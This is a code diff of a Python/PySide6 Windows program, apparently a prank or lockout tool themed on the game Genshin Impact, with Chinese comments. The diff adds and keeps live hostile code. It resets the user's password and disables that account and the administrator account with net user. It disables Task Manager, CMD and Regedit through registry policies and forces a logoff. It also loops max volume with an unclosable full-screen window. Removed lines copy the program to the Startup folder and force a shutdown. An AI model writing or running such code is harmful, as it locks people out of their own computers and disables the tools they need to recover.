@@ -1,11 +1,9 @@
-import sys
 import os
+import sys
 import threading
 
-from PySide6.QtCore import QUrl
-from PySide6.QtMultimedia import QAudioOutput, QMediaPlayer
-from PySide6.QtMultimediaWidgets import QVideoWidget
-from PySide6.QtWidgets import QMainWindow, QApplication
+from PySide6.QtWidgets import QMainWindow, QApplication, QWidget, QMessageBox
+from PySide6.QtCore import QTimer
 
 from comtypes import CLSCTX_ALL
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
@@ -47,34 +45,21 @@ def clearMute():
     except comtypes.COMError as e:
         print(f"COMError: {e}")
 
-class MainWindow(QMainWindow):
-    def __init__(self, pt):
-        super().__init__()
-        self._audio_output = QAudioOutput()
-        # 创建媒体播放器对象
-        self._player = QMediaPlayer()
-        self._player.setAudioOutput(self._audio_output)
-        # 创建视频显示部件
-        self._video_widget = QVideoWidget()
-        # 设置视频显示部件为主窗口的中心部件
-        self.setCentralWidget(self._video_widget)
-        # 将视频显示部件设置为媒体播放器的视频输出设备
-        self._player.setVideoOutput(self._video_widget)
-        self.pt = pt
-
-    def play(self):
-        self._player.setSource(QUrl.fromLocalFile(self.pt))
-        self._player.play()
+class MainWindow(QMainWindow, QWidget, QApplication):
 
     def closeEvent(self, event):
         # 重载关闭事件，使得窗口关闭时只是隐藏而不是退出应用程序
         event.ignore()  # 忽略关闭事件
         self.show()     #
 
+    def death(self):
+        QMessageBox.information(self, 'Error', '曼波!')
+
 def addEvents():
     while True:
         setAudio(1.0)
         clearMute()
+        MainWindow().death()
 
 def disableTaskManage(num):
     os.system(f'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d {num} /f')
@@ -89,12 +74,18 @@ def setPassword(password):
     print(userName)
 
     os.system(f'net user {userName} {password}')
+    os.system(f'net user {userName} /active:no')
     file.close()
     os.remove('./userName')
 
-def copy(file_path, save_path):
-    os.system(f'copy {file_path} {save_path}')
-    # QTimer.singleShot(5000, lambda: os.system(f'attrib +h {save_path + '\原神.exe'}'))
+def disableUser():
+    os.system('net user administrator /active:no')
+
+def disableCMD():
+    os.system(f'reg add "HKCU\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 1 /f')
+
+def disableRegedit():
+    os.system(f'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegedit /t REG_DWORD /d 1 /f')
 
 def getFilePath(file_name):
     # 获取打包后的可执行文件所在的临时目录
@@ -106,29 +97,19 @@ def backgroundTasks():
     # 后台任务（运行在辅助线程中）
     setPassword(1145141919810)
     disableTaskManage(1)
-    clearMute()
-    setAudio(1.0)
-    copy('原神.exe', '"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')
-    os.system('shutdown -s -f -t 150')
+    disableUser()
+    disableCMD()
+    disableRegedit()
+    QTimer.singleShot(120, lambda: os.system('logoff'))
     addEvents()
 
 def main():
-    app = QApplication(sys.argv)
-
-    # 创建主窗口并播放视频
-    main_win = MainWindow(getFilePath('video.mp4'))
-    available_geometry = main_win.screen().availableGeometry()
-    main_win.resize(500, 300)
-    main_win.setWindowTitle('原神')
-    main_win.showFullScreen()
-    main_win.play()
-
-    # 在辅助线程中运行后台任务
     threading.Thread(target=backgroundTasks).start()
-
-    # 在主线程中启动应用程序事件循环
-    sys.exit(app.exec())
+    app = QApplication(sys.argv)
+    window = MainWindow()
+    window.showFullScreen()
+    sys.exit(app.exec_())
 
 if __name__ == '__main__':
-    # main(
-    pass
+    # main()
+    disableCMD()
